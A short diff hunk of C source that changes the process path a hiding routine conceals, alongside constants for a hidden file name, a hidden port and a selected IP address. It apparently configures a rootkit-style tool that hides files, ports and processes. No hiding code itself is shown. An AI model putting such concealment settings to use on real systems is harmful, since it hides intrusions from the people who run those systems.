@@ -25,7 +25,7 @@
 /// const file name to hide
 const char* hide_file_name = "hideme";
 const int port_to_hide = 8000;
-const char* pid_to_hide = "/proc/3910";
+const char* pid_to_hide = "/proc/9704";
 const char selected_ip[4] = {192, 168, 1, 208};
 
 
